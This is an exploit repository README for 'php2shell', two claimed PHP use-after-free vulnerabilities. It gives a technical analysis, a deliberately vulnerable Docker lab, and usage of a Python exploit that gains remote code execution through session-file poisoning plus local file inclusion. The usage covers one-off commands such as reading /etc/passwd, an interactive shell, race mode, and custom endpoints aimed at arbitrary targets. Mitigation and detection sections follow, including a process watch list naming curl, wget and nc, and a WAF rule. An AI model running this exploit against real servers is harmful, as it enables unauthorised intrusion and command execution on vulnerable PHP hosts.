## https://sploitus.com/exploit?id=073727C0-3324-5366-A476-AEDA193953B0
# php2shell — CVE-2026-109618 / CVE-2026-109619

Proof-of-concept exploit and isolated lab environment for two critical heap use-after-free vulnerabilities in PHP core, collectively known as **php2shell**.

| | CVE-2026-109618 | CVE-2026-109619 |
|---|---|---|
| **Component** | `php_session_rfc1867_callback()` in `ext/session/session.c` | SAPI multipart form-data parser |
| **Bug class** | Heap use-after-free | Heap use-after-free |
| **Trigger** | Multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` field | Any `multipart/form-data` POST |
| **CVSS v4.0** | 9.2 | 9.2 |
| **Auth required** | No | No |

**Affected versions:** PHP 5.4.0 through 8.5.11  
**Patched versions:** 8.2.35, 8.3.36, 8.4.27, 8.5.12 (released 2026-10-21)

> **Legal disclaimer:** This repository is provided for authorized penetration testing, security research, and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for complying with all applicable laws. See [LICENSE](LICENSE).

---

## Table of Contents

- [Background](#background)
- [Technical Analysis](#technical-analysis)
- [Repository Structure](#repository-structure)
- [Quick Start](#quick-start)
- [Lab Environment](#lab-environment)
- [Exploit Usage](#exploit-usage)
- [UAF Crash Probe](#uaf-crash-probe)
- [Testing Mitigations](#testing-mitigations)
- [Detection & Indicators](#detection--indicators)
- [References](#references)

---

## Background

On October 20, 2026, details of two critical PHP vulnerabilities leaked ahead of the coordinated disclosure window. The PHP security team released emergency patches the following day at 14:00 UTC. Researchers at watchTowr independently confirmed both vulnerabilities.

The bugs reside in PHP's session upload progress tracking mechanism and the underlying multipart parser. Because `session.upload_progress.enabled` defaults to `On` in PHP's stock configuration, every default PHP installation from version 5.4 onward exposes the attack surface — no application code needs to opt in.

A proof-of-concept tool named "PHP2Shell" was attributed to Calif.IO and leaked alongside the advisory. Sansec predicted mass exploitation within 15 minutes of the patch release.

---

## Technical Analysis

### CVE-2026-109618 — Session Upload Progress UAF

PHP's [`session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php) feature tracks file upload progress by writing metadata to session files during multipart POST processing. The implementation in `php_session_rfc1867_callback()` stores raw `zval` pointers in live hash tables. Under specific conditions during request processing, these pointers become dangling when the underlying memory is freed but the hash table entry is not invalidated.

**Attack primitive:** An attacker sends a multipart POST containing a `PHP_SESSION_UPLOAD_PROGRESS` field. The field's value — which the attacker fully controls — is written into the session file at a predictable path (`/var/lib/php/sessions/sess_`). The session ID is supplied via cookie, and with `session.use_strict_mode = 0` (default), PHP accepts arbitrary values.

**Exploitation chain (session poisoning + LFI):**

```
┌──────────┐     POST multipart/form-data          ┌──────────┐
│ Attacker │ ─────────────────────────────────────►│  PHP-FPM │
│          │  Cookie: PHPSESSID=attacker_sid       │          │
│          │  Field: PHP_SESSION_UPLOAD_PROGRESS=  │          │
│          │                                       │          │
└──────────┘                                       └─────┬────┘
                                                         │
                                           Writes to session file:
                                           /var/lib/php/sessions/sess_attacker_sid
                                                         │
┌──────────┐     GET /vuln.php?file=                ┌────▼─────┐
│ Attacker │ ──────────────────────────────────────►│  PHP-FPM │
│          │ /var/lib/php/sessions/sess_attacker_sid│          │
│          │ &c=id                                  │          │
│          │◄───────────────────────────────────────│  → RCE   │
│          │  uid=33(www-data) ...                  │          │
└──────────┘                                        └──────────┘
```

### CVE-2026-109619 — Multipart Parser UAF

A second use-after-free exists in PHP's SAPI-level multipart parser, independent of the session upload progress feature. This bug triggers on any `multipart/form-data` POST and persists even when `session.upload_progress.enabled = Off`. The parser mishandles buffer ownership during part boundary processing, leading to a dangling pointer that can be leveraged for heap corruption.

### Exploitation Requirements

| Requirement | Chain 1 (Session Poisoning) | Chain 2 (Raw UAF) |
|---|---|---|
| `upload_progress.enabled` | On (default) | Not required |
| LFI vulnerability | Required | Not required |
| `upload_progress.cleanup` | Off, or race condition | N/A |
| Complexity | Low | High (heap grooming) |

---

## Repository Structure

```
php2shell/
├── README.md
├── LICENSE
├── .gitignore
├── Dockerfile                 # Vulnerable PHP 8.4.26 + nginx + php-fpm
├── docker-compose.yml         # Lab orchestration (port 8080)
├── php.ini                    # Vulnerable session configuration
├── nginx.conf                 # FastCGI proxy to php-fpm
├── supervisord.conf           # Process manager for nginx + php-fpm
├── www/
│   ├── index.php              # Configuration verification (phpinfo)
│   ├── upload.php             # Multipart upload endpoint
│   ├── view.php               # Intentional LFI vulnerability
│   └── debug.php              # Session file inspector
├── exploit/
│   ├── php2shell.py           # Main RCE exploit (session poisoning + LFI)
│   ├── uaf_probe.py           # Multipart parser UAF crash probe
│   └── requirements.txt       # Python dependencies
└── scripts/
    └── verify.sh              # Automated lab verification
```

---

## Quick Start

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/php2shell.git
cd php2shell

# Start the vulnerable lab
docker compose up --build -d

# Verify the lab is working
chmod +x scripts/verify.sh
bash scripts/verify.sh

# Run the exploit
pip install -r exploit/requirements.txt   # or: apt install python3-requests
python3 exploit/php2shell.py -t http://localhost:8080 -c "id"

# Interactive shell
python3 exploit/php2shell.py -t http://localhost:8080 --shell

# Cleanup
docker compose down
```

---

## Lab Environment

The Docker lab provides a deliberately vulnerable PHP environment:

| Component | Version | Notes |
|---|---|---|
| Ubuntu | 22.04 LTS | Base image |
| PHP | 8.4.26 | Last vulnerable release before 8.4.27 fix |
| nginx | Latest in repo | Reverse proxy to php-fpm |
| PHP-FPM | 8.4.26 | FastCGI process manager |

### Vulnerable Configuration (php.ini)

```ini
session.upload_progress.enabled = On     # Attack surface (default: On)
session.upload_progress.cleanup = Off    # Persist session data after upload
session.use_strict_mode = 0             # Accept arbitrary session IDs (default: 0)
session.use_only_cookies = 0            # Allow session ID from cookies
```

### Web Application

| Endpoint | Purpose |
|---|---|
| `index.php` | Displays PHP version and session configuration |
| `upload.php` | Accepts multipart file uploads (injection target) |
| `view.php?file=` | Intentional LFI — includes any local file (trigger) |
| `debug.php` | Lists session files and their contents for debugging |

---

## Exploit Usage

### php2shell.py — Session Poisoning RCE

```
usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check]
                    [--cmds CMD [CMD ...]] [--cmd-file FILE]
                    [--session-path PATH] [--inject-endpoint EP]
                    [--lfi-endpoint EP] [--race] [--threads N]
                    [--attempts N] [--proxy URL] [-o FILE] [-v] [-q]
```

#### Single Command

```bash
python3 exploit/php2shell.py -t http://localhost:8080 -c "cat /etc/passwd"
```

#### Interactive Shell

```bash
python3 exploit/php2shell.py -t http://localhost:8080 --shell
```

```
php2shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

php2shell> uname -a
Linux abc123 6.8.0 #1 SMP x86_64 GNU/Linux

php2shell> cat /etc/hostname
php2shell-lab
```

#### Batch Execution

```bash
# Inline commands
python3 exploit/php2shell.py -t http://localhost:8080 \
  --cmds "id" "whoami" "uname -a" "cat /etc/os-release"

# From file
python3 exploit/php2shell.py -t http://localhost:8080 --cmd-file recon.txt
```

#### Race Condition Mode

When `session.upload_progress.cleanup = On` (default), PHP deletes progress data from the session file immediately after the upload completes. The `--race` flag fires concurrent injection and LFI requests to read the session file before cleanup:

```bash
python3 exploit/php2shell.py -t http://localhost:8080 \
  --race --threads 20 --attempts 500 -c "id"
```

#### Reconnaissance Only

```bash
python3 exploit/php2shell.py -t https://target.example.com --check
python3 exploit/php2shell.py -t https://target.example.com --check --json
```

#### Proxy Support (Burp Suite)

```bash
python3 exploit/php2shell.py -t http://localhost:8080 -c "id" \
  --proxy http://127.0.0.1:8081
```

#### Custom Endpoints

For targets where the LFI and upload endpoints differ from the lab defaults:

```bash
python3 exploit/php2shell.py -t https://target.example.com \
  --inject-endpoint "/contact.php" \
  --lfi-endpoint "/page.php" \
  --session-path "/tmp" \
  -c "id"
```

---

## UAF Crash Probe

`uaf_probe.py` sends malformed multipart payloads to detect the CVE-2026-109619 parser vulnerability. It does not achieve code execution — it identifies vulnerable targets through crash behavior.

```bash
# Probe all variants
python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php

# Specific variants with repetition
python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php \
  --variant nested longheader --repeat 5 -v

# HTTPS target
python3 exploit/uaf_probe.py -t https://target.example.com/index.php
```

### Probe Variants

| Variant | Description |
|---|---|
| `nested` | Double-close boundary — triggers cleanup on already-freed buffer |
| `longheader` | 8KB+ Content-Disposition/Content-Type — stresses allocation |
| `nullbyte` | Null bytes in body — corrupts C string length calculations |
| `truncated` | Missing closing boundary — unexpected EOF during part read |
| `interleaved` | Mixed boundaries from different containers — confuses state machine |

### Interpreting Results

| Verdict | Meaning |
|---|---|
| `CRASH_LIKELY` | Connection reset or broken pipe — PHP worker probably segfaulted |
| `WORKER_DEAD` | HTTP 502/503 — nginx reports php-fpm worker died |
| `HANG_OR_CRASH` | Timeout — worker may be stuck or dead |
| `OK` | Normal response — this variant did not trigger a crash |

---

## Testing Mitigations

### Disable upload_progress (partial mitigation)

```bash
# Apply mitigation
docker exec php2shell-lab sed -i \
  's/upload_progress.enabled = On/upload_progress.enabled = Off/' \
  /etc/php/8.4/fpm/php.ini
docker exec php2shell-lab killall -USR2 php-fpm8.4

# Verify — should fail
python3 exploit/php2shell.py -t http://localhost:8080 -c "id"

# Revert
docker exec php2shell-lab sed -i \
  's/upload_progress.enabled = Off/upload_progress.enabled = On/' \
  /etc/php/8.4/fpm/php.ini
docker exec php2shell-lab killall -USR2 php-fpm8.4
```

> **Note:** Disabling `session.upload_progress` only blocks CVE-2026-109618. The multipart parser UAF (CVE-2026-109619) remains exploitable. Patching PHP is the only complete remediation.

### Enable strict mode

```bash
docker exec php2shell-lab sed -i \
  's/use_strict_mode = 0/use_strict_mode = 1/' \
  /etc/php/8.4/fpm/php.ini
docker exec php2shell-lab killall -USR2 php-fpm8.4
```

This prevents the attacker from controlling the session filename but does not eliminate the vulnerability.

---

## Detection & Indicators

### Process Monitoring

Alert when PHP worker processes spawn unexpected children:

```bash
# Parent processes: php-fpm, php-cgi, apache2, httpd
# Suspicious children: sh, bash, dash, python, perl, curl, wget, nc, ncat
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -d, php-fpm) -k php2shell
```

### Log Indicators

Session file poisoning leaves traces in:

- **PHP-FPM access logs:** POST requests with `PHP_SESSION_UPLOAD_PROGRESS` in the body, especially to endpoints that don't normally handle uploads
- **nginx access logs:** Sequential POST then GET to different endpoints with the same session cookie
- **Session directory:** Files containing `<?php` tags in `/var/lib/php/sessions/` or the configured `session.save_path`

```bash
# Check for poisoned session files
grep -rl '<?php' /var/lib/php/sessions/
```

### WAF Rules

Temporary mitigation via ModSecurity:

```
SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@contains <?php" \
  "id:2026109618,phase:2,deny,status:403,msg:'php2shell attempt'"
```

---

## References

- [Sansec — Critical PHP RCE: php2shell](https://sansec.io/research/php2shell)
- [watchTowr — PHP RCE FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [Huntress — php2shell Analysis](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
- [Lilting — Session Upload Progress UAF](https://lilting.ch/en/articles/php2shell-session-upload-progress-uaf)
- [Aikido — Critical PHP Vulnerabilities](https://www.aikido.dev/blog/critical-vulnerabilities-in-php-php2shell)
- [Phoenix Security — PHP Core RCE](https://phoenix.security/php-core-rce-cve-2026-109618-109619-critical-remote-code-execution/)
- [PHP Manual — Session Upload Progress](https://www.php.net/manual/en/session.upload-progress.php)
- [Wikipedia — PHP2Shell](https://en.wikipedia.org/wiki/PHP2Shell)